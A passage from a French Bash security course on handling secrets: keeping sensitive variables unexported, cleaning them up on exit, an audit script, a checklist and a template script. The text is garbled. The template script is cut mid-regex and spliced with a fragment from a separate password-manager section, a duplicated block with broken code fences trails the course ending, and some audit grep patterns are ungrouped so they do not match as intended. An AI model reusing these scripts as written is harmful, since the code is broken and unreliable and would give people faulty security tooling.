    local perms=$(stat -c "%a" "$secrets_file")
    if [[ "$perms" != "600" ]]; then
        echo "Erreur : permissions incorrectes sur $secrets_file" >&2
        return 1
    fi
    
    # Charger sans exporter
    while IFS='=' read -r key value; do
        # Ignorer les commentaires et lignes vides
        [[ "$key" =~ ^#.*$ || -z "$key" ]] && continue
        
        # Assigner sans exporter
        declare -g "${key}=${value}"
    done < "$secrets_file"
}

# 6. Nettoyer les variables sensibles à la sortie
cleanup() {
    unset db_password
    unset api_secret_key
    unset encryption_key
}

trap cleanup EXIT

# ===== UTILISATION =====

# Charger les secrets
load_secrets

# Utiliser les variables sensibles directement
mysql -u admin -p"$db_password" mydb << EOF
SELECT * FROM users;
EOF

# Appeler des fonctions avec variables sensibles
authenticate() {
    local token
    # Utiliser api_secret_key sans l'exporter
    token=$(curl -s -H "X-API-Key: $api_secret_key" https://api.example.com/auth)
    echo "$token"
}

# Les variables sont automatiquement nettoyées à la sortie
```

### 🔐 Audit et vérification

```bash
#!/bin/bash

# Script d'audit pour vérifier la gestion des variables sensibles
audit_script_security() {
    local script_file="$1"
    
    echo "=== Audit de sécurité : $script_file ==="
    echo ""
    
    # 1. Vérifier les exports de variables sensibles
    echo "📋 Vérification des exports..."
    if grep -n "export.*\(PASSWORD\|SECRET\|KEY\|TOKEN\)" "$script_file" 2>/dev/null; then
        echo "❌ PROBLÈME : Variables sensibles exportées trouvées"
    else
        echo "✅ OK : Pas d'export de variables sensibles"
    fi
    echo ""
    
    # 2. Vérifier les variables non quotées
    echo "📋 Vérification du quoting..."
    if grep -n '\$[A-Z_]*PASSWORD\|SECRET\|KEY' "$script_file" | grep -v '"' 2>/dev/null; then
        echo "⚠️  ATTENTION : Variables sensibles potentiellement non quotées"
    else
        echo "✅ OK : Variables correctement quotées"
    fi
    echo ""
    
    # 3. Vérifier le nettoyage des variables
    echo "📋 Vérification du nettoyage..."
    if grep -n "unset.*PASSWORD\|SECRET\|KEY" "$script_file" 2>/dev/null; then
        echo "✅ OK : Nettoyage des variables sensibles présent"
    else
        echo "⚠️  RECOMMANDATION : Ajouter le nettoyage des variables sensibles"
    fi
    echo ""
    
    # 4. Vérifier l'utilisation de readonly
    echo "📋 Vérification des constantes..."
    if grep -n "readonly" "$script_file" 2>/dev/null; then
        echo "✅ OK : Utilisation de readonly pour les constantes"
    else
        echo "ℹ️  INFO : Aucune constante readonly trouvée"
    fi
    echo ""
    
    echo "=== Fin de l'audit ==="
}

# Utilisation
audit_script_security "$0"
```

### 📊 Comparaison : Exporté vs Non-exporté

|Aspect|Variable NON exportée|Variable EXPORTÉE|
|---|---|---|
|Visibilité|Script actuel uniquement|Script + tous les processus enfants|
|Sécurité|Plus sécurisé|Moins sécurisé|
|Utilisation|Données sensibles|Configuration publique|
|Transmission|Doit être passée explicitement|Héritée automatiquement|
|Nettoyage|Automatique en fin de script|Persiste dans les enfants|
|Exemple|`db_password="secret"`|`export APP_NAME="MyApp"`|

> [!warning] Erreurs courantes
> 
> - Exporter des variables "par habitude" sans réfléchir à la sécurité
> - Utiliser `export` dans des fichiers de configuration sourcés
> - Oublier que même les sous-shells `( )` héritent des variables exportées
> - Penser que `unset` dans le parent nettoie aussi les enfants (faux !)

> [!tip] Règle simple **Si une variable contient un secret, ne l'exportez JAMAIS.** Passez-la explicitement aux fonctions ou commandes qui en ont besoin, via des arguments, stdin, ou des fichiers temporaires sécurisés.

---

## 🎓 Récapitulatif des bonnes pratiques de sécurité

### Checklist complète

- ✅ **Éviter `eval`** : Chercher des alternatives (accès indirect, case, tableaux)
- ✅ **Prévenir les injections** : Quoter toutes les variables, valider les entrées
- ✅ **Valider toutes les entrées** : Regex, plages, types, contexte
- ✅ **Chemins absolus** : Pour toutes les commandes critiques (rm, systemctl, etc.)
- ✅ **Umask restrictif** : 077 pour fichiers sensibles, restaurer l'original ensuite
- ✅ **Pas de mots de passe en clair** : Utiliser des gestionnaires de secrets, fichiers sécurisés, ou lecture interactive
- ✅ **Variables sensibles non exportées** : Jamais d'export pour secrets, nettoyer à la sortie

### Script modèle sécurisé

```bash
#!/bin/bash

# En-tête de sécurité
set -euo pipefail  # Arrêt sur erreur, variables non définies, erreurs de pipe

# Sauvegardes initiales
readonly ORIGINAL_UMASK=$(umask)
readonly ORIGINAL_PATH="$PATH"

# Configuration sécurisée
umask 077  # Permissions restrictives par défaut
PATH="/usr/local/bin:/usr/bin:/bin"  # PATH contrôlé
export PATH

# Commandes critiques avec chemins absolus
readonly RM=/bin/rm
readonly GREP=/usr/bin/grep
readonly SYSTEMCTL=/bin/systemctl

# Variables sensibles NON exportées
db_password=""
api_key=""

# Variables de configuration exportables
export APP_NAME="SecureApp"
export LOG_LEVEL="INFO"

# Fonction de nettoyage
cleanup() {
    # Restaurer umask
    umask "$ORIGINAL_UMASK"
    
    # Nettoyer les variables sensibles
    unset db_password
    unset api_key
    
    # Nettoyer les fichiers temporaires
    if [[ -n "${temp_file:-}" && -f "$temp_file" ]]; then
        "$RM" -f "$temp_file"
    fi
}

trap cleanup EXIT

# Validation des entrées
validate_input() {
    local input="$1"
    local pattern="$2"
    
    if [[ ! "$input" =~ $pattern ]]; then
        echo "Erreur : entrée invalide" >&2
        return 1
    fi
    return 0
}

# Chargement sécurisé des secrets
load_secrets() {
    local secrets_file="/etc/myapp/secrets.conf"
    
    # Vérifier les permissions
    if [[ -f "$secrets_file" ]]; then
        local perms=$(stat -c "%a" "$secrets_file")
        if [[ "$perms" != "600" ]]; then
            echo "Erreur : permissions incorrectes" >&2
            return 1
        fi
        
        # Charger sans exporter
        source "$secrets_file"
    fi
}

# Fonction principale
main() {
    local user_input="$1"
    
    # Validation
    if ! validate_input "$user_input" '^[a-zA-Z0-9_-]+
mysql -u admin -p"$db_password" mydb

# IMPORTANT : Nettoyer la variable
unset db_password
```

#### 4. Gestionnaires de secrets

```bash
#!/bin/bash

# Utilisation de pass (password manager)
get_secret_from_pass() {
    local secret_name="$1"
    
    if ! command -v pass &>/dev/null; then
        echo "Erreur : 'pass' n'est pas installé" >&2
        return 1
    fi
    
    pass show "$secret_name" 2>/dev/null
}

# Récupérer le mot de passe depuis pass
DB_PASSWORD=$(get_secret_from_pass "myapp/database")

if [[ -z "$DB_PASSWORD" ]]; then
    echo "Erreur : impossible de récupérer le secret" >&2
    exit 1
fi

# Utiliser le mot de passe; then
        exit 1
    fi
    
    # Charger les secrets
    load_secrets || exit 1
    
    # Utiliser les commandes avec chemins absolus
    "$GREP" "$user_input" /var/log/app.log
    
    # Traitement sécurisé...
}

# Point d'entrée
if [[ $# -ne 1 ]]; then
    echo "Usage: $0 <input>" >&2
    exit 1
fi

main "$1"

# cleanup() sera appelé automatiquement à la sortie
```

> [!info] Ressources pour aller plus loin
> 
> - **ShellCheck** : Outil d'analyse statique pour détecter les problèmes de sécurité
> - **OWASP** : Guidelines pour la sécurité des scripts
> - **CIS Benchmarks** : Standards de sécurité pour les systèmes Unix/Linux

---

_Fin du cours sur la sécurité en Bash_ 🔒 mysql -u admin -p"$db_password" mydb

# IMPORTANT : Nettoyer la variable

unset db_password

````

#### 4. Gestionnaires de secrets

```bash
#!/bin/bash

# Utilisation de pass (password manager)
get_secret_from_pass() {
    local secret_name="$1"
    
    if ! command -v pass &>/dev/null; then
        echo "Erreur : 'pass' n'est pas installé" >&2
        return 1
    fi
    
    pass show "$secret_name" 2>/dev/null
}

# Récupérer le mot de passe depuis pass
DB_PASSWORD=$(get_secret_from_pass "myapp/database")

if [[ -z "$DB_PASSWORD" ]]; then
    echo "Erreur : impossible de récupérer le secret" >&2
    exit 1
fi

# Utiliser le mot de passe
````